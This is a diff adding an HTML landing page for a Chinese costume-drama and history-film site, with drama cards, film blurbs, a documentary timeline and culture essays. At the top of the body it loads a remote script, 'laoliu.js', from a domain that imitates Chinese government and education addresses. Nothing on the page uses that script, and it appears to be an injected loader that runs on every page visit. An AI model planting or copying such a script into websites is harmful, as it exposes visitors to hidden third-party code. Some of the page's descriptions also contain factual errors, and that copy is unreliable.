@@ -1,0 +1,530 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>悠久影视 - 古装国风影视精品与历史文化解读</title>
+<meta name="description" content="悠久影视精选古装剧、国风电影、历史纪录片，配以深度的历史文化解读，带您领略中华五千年影视之美与人文底蕴。">
+<meta name="keywords" content="悠久影视,古装剧,国风电影,历史纪录片,中华文化,影视解读">
+<link rel="canonical" href="https://youjiuyingshi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Noto Serif SC","Source Han Serif SC","STSong","SimSun","PingFang SC",serif;
+  background:#f5f0e8;color:#2a2018;line-height:1.9;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+section[id]{scroll-margin-top:0}
+
+/* 宣纸纹理背景 */
+body::before{
+  content:'';position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background:
+    radial-gradient(ellipse at 20% 10%,rgba(139,90,43,.03),transparent 50%),
+    radial-gradient(ellipse at 80% 90%,rgba(160,82,45,.03),transparent 50%);
+}
+
+/* 导航 - 印章风格 */
+.nav{
+  position:sticky;top:0;z-index:999;background:rgba(245,240,232,.92);backdrop-filter:blur(8px);
+  border-bottom:1px solid #d4c5a9;
+}
+.nav-in{
+  max-width:1240px;margin:0 auto;height:64px;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.logo{
+  display:flex;align-items:center;gap:10px;
+}
+.logo-seal{
+  width:36px;height:36px;border:2px solid #8b5a2b;border-radius:4px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:16px;font-weight:700;color:#8b5a2b;font-family:"KaiTi","STKaiti",serif;
+}
+.logo-text{font-size:20px;font-weight:700;letter-spacing:4px;color:#2a2018}
+.menu{display:flex;gap:8px}
+.menu a{
+  font-size:14px;letter-spacing:2px;color:#5a4a38;padding:6px 14px;
+  border-bottom:2px solid transparent;transition:.3s;
+}
+.menu a:hover{border-bottom-color:#8b5a2b;color:#8b5a2b}
+
+/* Hero - 水墨首屏 */
+.hero{
+  position:relative;min-height:85vh;display:flex;align-items:center;
+  overflow:hidden;
+}
+.hero-bg{
+  position:absolute;inset:0;z-index:0;
+  background:url("https://picsum.photos/1800/1000?random=701") center/cover no-repeat;
+  filter:sepia(.3) brightness(.6);
+}
+.hero-bg::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(42,32,24,.75),rgba(139,90,43,.5));
+}
+.hero-in{
+  position:relative;z-index:1;max-width:1240px;margin:0 auto;padding:60px 20px;width:100%;
+}
+.hero-subtitle{
+  font-size:14px;letter-spacing:12px;color:#d4a574;margin-bottom:20px;
+  writing-mode:vertical-rl;position:absolute;right:20px;top:80px;height:200px;
+}
+.hero h1{
+  font-size:clamp(40px,7vw,72px);font-weight:700;color:#f5f0e8;line-height:1.4;
+  font-family:"KaiTi","STKaiti",serif;letter-spacing:6px;
+}
+.hero h1 .em{color:#d4a574}
+.hero-desc{
+  font-size:16px;color:#e8dcc8;max-width:560px;margin:24px 0 32px;letter-spacing:1px;
+}
+.hero-btn{
+  display:inline-block;padding:12px 36px;border:1px solid #d4a574;color:#d4a574;
+  font-size:14px;letter-spacing:4px;transition:.3s;
+}
+.hero-btn:hover{background:#d4a574;color:#2a2018}
+
+/* 诗词引言条 */
+.poem-bar{
+  background:#3d2e1f;padding:24px 20px;text-align:center;
+}
+.poem-bar p{
+  font-family:"KaiTi","STKaiti",serif;font-size:18px;color:#d4a574;letter-spacing:3px;
+}
+.poem-bar span{display:block;font-size:12px;color:#8b7355;margin-top:8px;letter-spacing:2px}
+
+/* 区块通用 */
+.block{max-width:1240px;margin:0 auto;padding:72px 20px}
+.block-head{text-align:center;margin-bottom:48px}
+.block-head .seal-num{
+  display:inline-block;font-family:"KaiTi","STKaiti",serif;font-size:13px;color:#8b5a2b;
+  border:1px solid #8b5a2b;border-radius:50%;width:36px;height:36px;line-height:36px;
+  margin-bottom:12px;
+}
+.block-head h2{
+  font-size:clamp(24px,3.5vw,36px);font-weight:700;letter-spacing:6px;color:#2a2018;
+  font-family:"KaiTi","STKaiti",serif;
+}
+.block-head p{font-size:14px;color:#7a6a55;margin-top:10px;letter-spacing:1px}
+
+/* 古装剧 - 竖排画卷 */
+.scroll-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:28px;
+}
+.scroll-card{
+  background:#fffdf8;border:1px solid #e0d5bc;padding:14px;box-shadow:2px 4px 12px rgba(139,90,43,.08);
+  transition:.4s;
+}
+.scroll-card:hover{transform:translateY(-6px);box-shadow:4px 12px 28px rgba(139,90,43,.15)}
+.scroll-card .img-wrap{
+  position:relative;overflow:hidden;margin-bottom:14px;
+}
+.scroll-card img{width:100%;height:320px;object-fit:cover;transition:.6s}
+.scroll-card:hover img{transform:scale(1.05)}
+.scroll-card .corner{
+  position:absolute;top:8px;right:8px;background:rgba(42,32,24,.85);color:#d4a574;
+  font-size:11px;padding:3px 10px;letter-spacing:1px;font-family:"KaiTi","STKaiti",serif;
+}
+.scroll-card h3{font-size:18px;font-weight:700;letter-spacing:2px;margin-bottom:6px}
+.scroll-card .meta{font-size:13px;color:#8b7355;margin-bottom:8px}
+.scroll-card p{font-size:13px;color:#5a4a38;line-height:1.8}
+
+/* 国风电影 - 左右交替 */
+.alt-list{display:flex;flex-direction:column;gap:0}
+.alt-row{
+  display:grid;grid-template-columns:1fr 1fr;min-height:280px;
+}
+.alt-row:nth-child(even) .alt-img{order:2}
+.alt-img{overflow:hidden}
+.alt-img img{width:100%;height:100%;object-fit:cover}
+.alt-text{
+  display:flex;flex-direction:column;justify-content:center;padding:40px;
+  background:#fffdf8;border-top:1px solid #e0d5bc;border-bottom:1px solid #e0d5bc;
+}
+.alt-text .dyn{font-family:"KaiTi","STKaiti",serif;font-size:13px;color:#8b5a2b;letter-spacing:2px;margin-bottom:8px}
+.alt-text h3{font-size:22px;font-weight:700;letter-spacing:3px;margin-bottom:12px}
+.alt-text p{font-size:14px;color:#5a4a38;line-height:1.9}
+.alt-text .tag{
+  display:inline-block;margin-top:14px;font-size:12px;color:#8b5a2b;
+  border:1px solid #d4c5a9;padding:3px 12px;align-self:flex-start;
+}
+
+/* 历史纪录 - 时间轴竖线 */
+.chrono{position:relative;padding:20px 0}
+.chrono::before{
+  content:'';position:absolute;left:50%;top:0;bottom:0;width:1px;background:#d4c5a9;
+}
+.chrono-item{position:relative;margin-bottom:40px;width:50%;padding-right:40px}
+.chrono-item:nth-child(even){margin-left:50%;padding-right:0;padding-left:40px}
+.chrono-item::before{
+  content:'';position:absolute;right:-6px;top:24px;width:11px;height:11px;
+  border-radius:50%;background:#8b5a2b;border:3px solid #f5f0e8;
+}
+.chrono-item:nth-child(even)::before{right:auto;left:-6px}
+.chrono-card{
+  background:#fffdf8;border:1px solid #e0d5bc;padding:22px;
+}
+.chrono-year{
+  font-family:"KaiTi","STKaiti",serif;font-size:24px;color:#8b5a2b;font-weight:700;margin-bottom:6px;
+}
+.chrono-card h3{font-size:17px;font-weight:700;letter-spacing:2px;margin-bottom:8px}
+.chrono-card p{font-size:13px;color:#5a4a38;line-height:1.8}
+
+/* 文化解读 - 书页卡片 */
+.book-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:24px}
+.book-card{
+  background:#fffdf8;border:1px solid #e0d5bc;padding:28px;position:relative;
+  transition:.3s;
+}
+.book-card::before{
+  content:'';position:absolute;top:0;left:0;width:3px;height:0;
+  background:#8b5a2b;transition:.4s;
+}
+.book-card:hover::before{height:100%}
+.book-card:hover{box-shadow:0 8px 24px rgba(139,90,43,.1)}
+.book-card .chapter{
+  font-family:"KaiTi","STKaiti",serif;font-size:12px;color:#8b7355;letter-spacing:3px;margin-bottom:10px;
+}
+.book-card h3{font-size:18px;font-weight:700;letter-spacing:2px;margin-bottom:10px}
+.book-card p{font-size:14px;color:#5a4a38;line-height:1.9}
+.book-card .more{display:inline-block;margin-top:14px;font-size:13px;color:#8b5a2b;letter-spacing:1px}
+.book-card .more:hover{text-decoration:underline}
+
+/* 关于 - 印章方块 */
+.about-wrap{
+  display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center;
+}
+.about-seal-area{display:flex;flex-direction:column;align-items:center;gap:20px}
+.big-seal{
+  width:140px;height:140px;border:3px solid #8b5a2b;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-family:"KaiTi","STKaiti",serif;font-size:36px;color:#8b5a2b;font-weight:700;
+  writing-mode:vertical-rl;text-orientation:upright;letter-spacing:8px;
+}
+.about-text h2{
+  font-family:"KaiTi","STKaiti",serif;font-size:28px;letter-spacing:4px;margin-bottom:20px;
+}
+.about-text p{font-size:15px;color:#5a4a38;margin-bottom:14px;line-height:2}
+.about-text .url{color:#8b5a2b;font-weight:700;font-size:16px}
+
+/* 页脚 */
+.foot{
+  background:#3d2e1f;padding:48px 20px 28px;text-align:center;
+}
+.foot-seal{
+  width:48px;height:48px;border:2px solid #d4a574;border-radius:6px;margin:0 auto 20px;
+  display:flex;align-items:center;justify-content:center;
+  font-family:"KaiTi","STKaiti",serif;font-size:20px;color:#d4a574;
+}
+.foot-links{display:flex;justify-content:center;gap:28px;flex-wrap:wrap;margin-bottom:20px}
+.foot-links a{font-size:13px;color:#8b7355;letter-spacing:2px}
+.foot-links a:hover{color:#d4a574}
+.foot p{font-size:12px;color:#5a4a38;letter-spacing:1px}
+
+@media(max-width:820px){
+  .menu{display:none}
+  .hero-subtitle{display:none}
+  .scroll-grid{grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:16px}
+  .scroll-card img{height:220px}
+  .alt-row{grid-template-columns:1fr}
+  .alt-row:nth-child(even) .alt-img{order:0}
+  .alt-img{min-height:220px}
+  .alt-text{padding:28px 20px}
+  .chrono::before{left:8px}
+  .chrono-item{width:100%;padding-left:32px!important;padding-right:0!important;margin-left:0!important}
+  .chrono-item::before{left:2px!important;right:auto!important}
+  .book-grid{grid-template-columns:1fr}
+  .about-wrap{grid-template-columns:1fr}
+  .block{padding:50px 20px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="nav">
+  <div class="nav-in">
+    <div class="logo">
+      <div class="logo-seal">悠</div>
+      <span class="logo-text">悠久影视</span>
+    </div>
+    <nav class="menu">
+      <a href="#home">首页</a>
+      <a href="#drama">古装剧</a>
+      <a href="#film">国风电影</a>
+      <a href="#doc">历史纪录</a>
+      <a href="#culture">文化解读</a>
+      <a href="#about">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- Hero 水墨首屏 -->
+<section class="hero" id="home">
+  <div class="hero-bg"></div>
+  <div class="hero-subtitle">光影流转 · 千年风华</div>
+  <div class="hero-in">
+    <h1>悠久<span class="em">影视</span><br>一眼千年</h1>
+    <p class="hero-desc">从先秦到明清，从诗词歌赋到金戈铁马。悠久影视精选古装国风影视精品，配以深度的历史文化解读，带您穿越时空，领略中华五千年的人文底蕴与光影之美。</p>
+    <a href="#drama" class="hero-btn">开卷品鉴</a>
+  </div>
+</section>
+
+<!-- 诗词引言 -->
+<div class="poem-bar">
+  <p>「大江东去，浪淘尽，千古风流人物」</p>
+  <span>—— 每一帧光影，都是历史的回响</span>
+</div>
+
+<!-- 古装剧 -->
+<section class="block" id="drama">
+  <div class="block-head">
+    <div class="seal-num">壹</div>
+    <h2>古装剧集</h2>
+    <p>经典古装剧作，重现历史风云与古典美学</p>
+  </div>
+  <div class="scroll-grid">
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=711" alt="悠久影视 琅琊榜">
+        <span class="corner">权谋</span>
+      </div>
+      <h3>琅琊榜</h3>
+      <div class="meta">古装 / 权谋 / 46集</div>
+      <p>麒麟才子梅长苏，以病弱之躯搅动朝堂风云。十二年前赤焰冤案，十二年后步步为营，只为昭雪忠魂。</p>
+    </div>
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=712" alt="悠久影视 长安十二时辰">
+        <span class="corner">悬疑</span>
+      </div>
+      <h3>长安十二时辰</h3>
+      <div class="meta">古装 / 悬疑 / 24集</div>
+      <p>上元佳节，盛世长安暗流涌动。死囚张小敬临危受命，十二时辰内拯救大唐都城于危难之中。</p>
+    </div>
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=713" alt="悠久影视 清平乐">
+        <span class="corner">历史</span>
+      </div>
+      <h3>清平乐</h3>
+      <div class="meta">古装 / 历史 / 69集</div>
+      <p>以宋仁宗赵祯的一生为主线，展现北宋仁宗盛治时期，朝堂与后宫交织的恢弘画卷。</p>
+    </div>
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=714" alt="悠久影视 鹤唳华亭">
+        <span class="corner">悲情</span>
+      </div>
+      <h3>鹤唳华亭</h3>
+      <div class="meta">古装 / 悲剧 / 60集</div>
+      <p>萧定权身处东宫之位，夹在父皇猜忌与权臣倾轧之间。以文人之骨，守太子之道。</p>
+    </div>
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=715" alt="悠久影视 知否">
+        <span class="corner">宅斗</span>
+      </div>
+      <h3>知否知否应是绿肥红瘦</h3>
+      <div class="meta">古装 / 宅斗 / 78集</div>
+      <p>庶女明兰在深宅大院中隐忍成长，以智慧化解一次次家族危机，终得自在人生。</p>
+    </div>
+    <div class="scroll-card">
+      <div class="img-wrap">
+        <img src="https://picsum.photos/400/520?random=716" alt="悠久影视 大明王朝">
+        <span class="corner">史诗</span>
+      </div>
+      <h3>大明王朝1566</h3>
+      <div class="meta">古装 / 历史 / 46集</div>
+      <p>嘉靖与海瑞，君臣之间的博弈。一部剧写尽明朝中后期的财政危机与官场生态。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 国风电影 -->
+<section class="block" id="film" style="background:#efe7d8">
+  <div class="block-head">
+    <div class="seal-num">贰</div>
+    <h2>国风电影</h2>
+    <p>东方美学大银幕，水墨丹青入画来</p>
+  </div>
+  <div class="alt-list">
+    <div class="alt-row">
+      <div class="alt-img"><img src="https://picsum.photos/700/500?random=721" alt="悠久影视 影"></div>
+      <div class="alt-text">
+        <div class="dyn">三国 · 权谋</div>
+        <h3>影</h3>
+        <p>张艺谋执导，以水墨画风呈现一个关于替身的故事。沛国都督子虞被敌国战将杨苍击败，启用替身境州，一场关于身份与野心的博弈就此展开。</p>
+        <span class="tag">水墨美学 · 黑白意象</span>
+      </div>
+    </div>
+    <div class="alt-row">
+      <div class="alt-img"><img src="https://picsum.photos/700/500?random=722" alt="悠久影视 刺客聂隐娘"></div>
+      <div class="alt-text">
+        <div class="dyn">唐 · 武侠</div>
+        <h3>刺客聂隐娘</h3>
+        <p>侯孝贤导演作品，以极简对白和留白镜头，讲述唐代传奇女刺客聂隐娘奉师命返家刺杀表兄田季安的故事，展现一种克制的东方武侠美学。</p>
+        <span class="tag">东方武侠 · 极简留白</span>
+      </div>
+    </div>
+    <div class="alt-row">
+      <div class="alt-img"><img src="https://picsum.photos/700/500?random=723" alt="悠久影视 英雄"></div>
+      <div class="alt-text">
+        <div class="dyn">秦 · 史诗</div>
+        <h3>英雄</h3>
+        <p>张艺谋经典之作，以无名刺秦为线索，用红、蓝、绿、白、黑五种色彩讲述同一个故事的不同版本，探讨"天下"二字的分量。</p>
+        <span class="tag">色彩叙事 · 宏大格局</span>
+      </div>
+    </div>
+    <div class="alt-row">
+      <div class="alt-img"><img src="https://picsum.photos/700/500?random=724" alt="悠久影视 满江红"></div>
+      <div class="alt-text">
+        <div class="dyn">宋 · 悬疑</div>
+        <h3>满江红</h3>
+        <p>南宋绍兴年间，岳飞死后四年。秦桧率兵与金国会谈，一名亲兵突然死亡，引发一场小兵张大与秦桧手下亲信的智斗，最终只为传一首《满江红》。</p>
+        <span class="tag">剧本杀结构 · 喜剧悬疑</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 历史纪录 -->
+<section class="block" id="doc">
+  <div class="block-head">
+    <div class="seal-num">叁</div>
+    <h2>历史纪录</h2>
+    <p>以影像为笔，书写中华文明编年史</p>
+  </div>
+  <div class="chrono">
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">先秦</div>
+        <h3>楚国八百年</h3>
+        <p>大型历史纪录片，从楚人的起源讲起，历经八百年兴衰，展现楚文化的浪漫与雄奇，以及屈原、老子等文化巨匠的精神遗产。</p>
+      </div>
+    </div>
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">汉唐</div>
+        <h3>河西走廊</h3>
+        <p>以河西走廊为叙事线索，从汉代张骞凿空西域到隋唐盛世，再到明清变迁，呈现这条连接东西方文明通道的历史地位与文化价值。</p>
+      </div>
+    </div>
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">宋代</div>
+        <h3>清明上河图密码</h3>
+        <p>以张择端的《清明上河图》为蓝本，通过数字技术还原北宋汴京的城市面貌与社会生活，解码画作中隐藏的历史信息。</p>
+      </div>
+    </div>
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">明代</div>
+        <h3>大明宫词</h3>
+        <p>聚焦大明宫的兴衰，以建筑为切入点，讲述唐朝宫廷政治、文化生活与权力斗争，重现盛世帝国的建筑奇迹与历史沧桑。</p>
+      </div>
+    </div>
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">近代</div>
+        <h3>故宫</h3>
+        <p>十二集大型纪录片，以紫禁城为舞台，讲述明清两朝的宫廷生活、重大事件与文化传承，展现中国古代建筑艺术与皇家气派。</p>
+      </div>
+    </div>
+    <div class="chrono-item">
+      <div class="chrono-card">
+        <div class="chrono-year">非遗</div>
+        <h3>我在故宫修文物</h3>
+        <p>聚焦故宫文物修复师群体，展现青铜器、书画、陶瓷等珍贵文物的修复过程，传递工匠精神与中华文明的延续之道。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 文化解读 -->
+<section class="block" id="culture" style="background:#efe7d8">
+  <div class="block-head">
+    <div class="seal-num">肆</div>
+    <h2>文化解读</h2>
+    <p>影视背后的历史真相与文化密码</p>
+  </div>
+  <div class="book-grid">
+    <div class="book-card">
+      <div class="chapter">第一章 · 服饰</div>
+      <h3>《长安十二时辰》中的唐代服饰密码</h3>
+      <p>从李必的莲花冠到侍女的襦裙，剧中每一套服饰都有史料依据。解析唐代服装形制、色彩等级与织造工艺，看剧组如何用服饰还原一个真实的大唐。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+    <div class="book-card">
+      <div class="chapter">第二章 · 礼仪</div>
+      <h3>古装剧中"跪拜礼"的正确姿势</h3>
+      <p>稽首、顿首、空首、振动——古代跪拜礼分九种，各有场合。盘点热门古装剧中礼仪的还原度，哪些是真历史，哪些是为了戏剧效果的艺术加工。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+    <div class="book-card">
+      <div class="chapter">第三章 · 建筑</div>
+      <h3>影视城 vs 真实古迹：取景地的选择逻辑</h3>
+      <p>横店、象山、襄阳唐城……为什么《庆余年》选在襄阳唐城，《清平乐》却去了横店？分析古装剧取景背后的地理、建筑形制与拍摄成本考量。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+    <div class="book-card">
+      <div class="chapter">第四章 · 饮食</div>
+      <h3>古装剧里的"穿越食物"大盘点</h3>
+      <p>玉米、辣椒、番茄、土豆——这些我们以为的"传统食物"其实是明代才传入中国的美洲作物。梳理古装剧中常见的"时代错误"饮食。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+    <div class="book-card">
+      <div class="chapter">第五章 · 音乐</div>
+      <h3>影视配乐中的中国传统乐器运用</h3>
+      <p>从《卧虎藏龙》的琵琶到《英雄》的鼓乐，分析国产影视作品中古琴、笛子、二胡等民族乐器的叙事功能与情感表达技巧。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+    <div class="book-card">
+      <div class="chapter">第六章 · 文字</div>
+      <h3>影视剧片名的书法艺术</h3>
+      <p>《影》的隶书、《长安十二时辰》的楷书、《琅琊榜》的行书——每部古装剧的片名书法都暗含深意，解读片名字体选择与剧集气质的对应关系。</p>
+      <a href="#" class="more">展开阅读 →</a>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="block" id="about">
+  <div class="block-head">
+    <div class="seal-num">伍</div>
+    <h2>关于悠久影视</h2>
+    <p>传承中华文化 · 品鉴光影之美</p>
+  </div>
+  <div class="about-wrap">
+    <div class="about-seal-area">
+      <div class="big-seal">悠久影视</div>
+      <p style="font-family:'KaiTi','STKaiti',serif;font-size:14px;color:#8b7355;letter-spacing:4px">光影流转 · 千年风华</p>
+    </div>
+    <div class="about-text">
+      <h2>源起</h2>
+      <p>悠久影视创立于对中国传统文化的热爱与敬意。我们相信，每一部优秀的古装影视作品，都是一扇通往历史的窗口，一场跨越时空的对话。</p>
+      <p>平台精选高质量古装剧、国风电影与历史纪录片，并配以深度的文化解读，帮助观众不仅"看热闹"，更能"看门道"。</p>
+      <p>官方网站：<span class="url">https://youjiuyingshi-h5.github.io</span></p>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="foot">
+  <div class="foot-seal">悠</div>
+  <div class="foot-links">
+    <a href="#drama">古装剧</a>
+    <a href="#film">国风电影</a>
+    <a href="#doc">历史纪录</a>
+    <a href="#culture">文化解读</a>
+    <a href="#about">关于</a>
+  </div>
+  <p>© 2024 悠久影视 · 网站网址：https://youjiuyingshi-h5.github.io · 传承中华光影之美</p>
+</footer>
+
+</body>
+</html>
